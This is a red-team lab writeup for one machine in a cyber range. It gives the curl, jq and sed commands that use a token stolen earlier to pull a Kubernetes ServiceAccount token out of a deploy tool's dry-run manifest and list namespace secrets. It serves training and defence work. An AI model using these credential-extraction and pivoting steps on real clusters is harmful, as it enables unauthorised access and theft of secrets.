# solve_red.md — M5 · dev-deploy
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M5 — PUL Deploy Commander
**Vulnerability:** Dry-run API returns a manifest containing a ServiceAccount token
**MITRE ATT&CK:** T1552.001

---

## Objective

Use the Deploy Commander token retrieved from M4 to list applications and request a dry-run sync for `pul-ota-firmware`.

## Environment

| Item | Value |
|---|---|
| Deploy Commander | `203.0.3.36:8888` |
| API token source | `$RANGE3_DIR/sonar-settings.json` |
| Application | `pul-ota-firmware` |
| Kubernetes API | `203.0.2.188:6443` |
| Namespace | `pul-production` |
| API access | Restricted to the lab Kali source and Deploy Commander host |

## Step-by-Step Exploitation

### Step 1 — Prepare the workspace and verify Deploy Commander

Use the same Kali terminal as M1–M4. Keep the workspace private:

```bash
export RANGE3_DIR="${RANGE3_DIR:-$(mktemp -d /tmp/range3.XXXXXX)}"
```

```bash
chmod 700 "$RANGE3_DIR"
```

```bash
umask 077
```

```bash
curl --max-time 8 -fsS http://203.0.3.36:8888/api/health | jq .
```

Load the Deploy Commander token retrieved from M4:

```bash
export DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
```

```bash
curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
```

The response includes `pul-ota-firmware`.

### Step 2 — Request a dry-run manifest

```bash
curl --max-time 8 -fsS -X POST "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" -H "Authorization: Bearer ${DEPLOY_TOKEN}" -o "$RANGE3_DIR/dryrun.json"
```

```bash
jq '{result, warning, manifest_present: (.manifest != null)}' "$RANGE3_DIR/dryrun.json"
```

<img width="1307" height="220" alt="Earlier Deploy Commander dry-run response; does not verify the current cluster endpoint" src="https://github.com/user-attachments/assets/c14f2f6e-e498-418c-a92e-1505c37781e7" />

The screenshot is historical and does not verify the current cluster endpoint. The live command above returns the current manifest.

The API returns the manifest without applying the Deployment. The manifest now points to the provisioned Kubernetes API at `203.0.2.188:6443` and the deployed registry at `203.0.3.36:5000`.

### Step 3 — Extract the cluster connection data

```bash
jq -r '.manifest' "$RANGE3_DIR/dryrun.json" | grep -E 'kind: Secret|cluster_endpoint:|namespace:' | sed -E 's/(token:).*/\1 <redacted>/'
```

Keep using the same terminal. The following commands extract the endpoint and the base64-encoded ServiceAccount token and CA certificate without printing their values.

```bash
M5_MANIFEST="$(jq -r '.manifest' "$RANGE3_DIR/dryrun.json")"
```

```bash
CLUSTER_ENDPOINT="$(printf '%s\n' "$M5_MANIFEST" | sed -n 's/^  cluster_endpoint: "\([^"]*\)"/\1/p')"
```

```bash
SA_TOKEN_B64="$(printf '%s\n' "$M5_MANIFEST" | sed -n '/^data:/,/^---/s/^  token: //p')"
```

```bash
CLUSTER_CA_B64="$(printf '%s\n' "$M5_MANIFEST" | sed -n '/^data:/,/^---/s/^  ca.crt: //p')"
```

```bash
SA_TOKEN="$(printf '%s' "$SA_TOKEN_B64" | base64 -d)"
```

After the Kubernetes host is reprovisioned, rerun Steps 2 and 3 before querying it. Values left in `CLUSTER_CA_B64` or `SA_TOKEN` from the previous cluster will fail TLS verification or authentication.

```bash
printf 'Current cluster endpoint: %s\n' "$CLUSTER_ENDPOINT"
```

### Step 4 — Query the Kubernetes namespace

The ServiceAccount is limited to reading Pods, Deployments, Services, ConfigMaps, and Secrets in `pul-production`.

```bash
curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/secrets" | jq -r '.items[].metadata.name'
```

The current setup returns `pul-ota-deployer-token`. A cluster-wide Secret list is denied:

```bash
curl --max-time 8 -sS -o /dev/null -w 'Cluster-wide secret list HTTP %{http_code}\n' --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/secrets"
```

Expected status: `403`. The API certificate is verified against the CA from the manifest; do not disable TLS verification. The Kubernetes API firewall allows the observed Kali source and the Deploy Commander host, and drops other sources.

Check whether the namespace has Pods:

```bash
curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/pods" | jq -r 'if (.items|length)==0 then "No Pods in pul-production" else .items[].metadata.name end'
```

The cluster is a single-node K3s lab instance. The dry-run remains non-mutating; no firmware Deployment is applied by these commands.

### Live flag check

The live check on 2026-11-04 reached the rebuilt Kubernetes API at `https://203.0.2.188:6443` with certificate verification enabled. In `pul-production`, the ServiceAccount can currently see only the `pul-ota-deployer-token` Secret and the cluster configuration ConfigMap. There are no Pods, Deployments, or Services in the namespace, and no flag Secret or ConfigMap is provisioned. The ServiceAccount Secret contains only its token, CA certificate, and namespace fields; their values are not printed here.

List Secret names and data key names without exposing values:

```bash
curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/secrets" | jq -r '.items[] | [.metadata.name, ((.data // {}) | keys | join(","))] | @tsv'
```

Check for running Pods:

```bash
curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/pods" | jq -r 'if (.items|length)==0 then "No Pods in pul-production" else .items[].metadata.name end'
```

No flag was retrieved because the current namespace has no flag-bearing resource or application workload. A challenge workload and its flag must be provisioned in the lab before this pivot can produce a flag. Do not report the ServiceAccount token or dry-run response as the flag.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Cloud Service Discovery | T1526 |

## Local cleanup

After completing the lab steps, remove the downloaded files and clear the shell variables:

```bash
rm -f "$RANGE3_DIR/docker-config.json" "$RANGE3_DIR/registry-config.json" "$RANGE3_DIR/sonarqube-access.env" "$RANGE3_DIR/sonar-settings.json" "$RANGE3_DIR/dryrun.json"
```

```bash
rmdir "$RANGE3_DIR"
```

```bash
unset REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE MINIO_ACCESS_KEY MINIO_SECRET_KEY DEPLOY_TOKEN RANGE3_DIR
```

```bash
unset M5_MANIFEST CLUSTER_ENDPOINT SA_TOKEN_B64 CLUSTER_CA_B64 SA_TOKEN
```
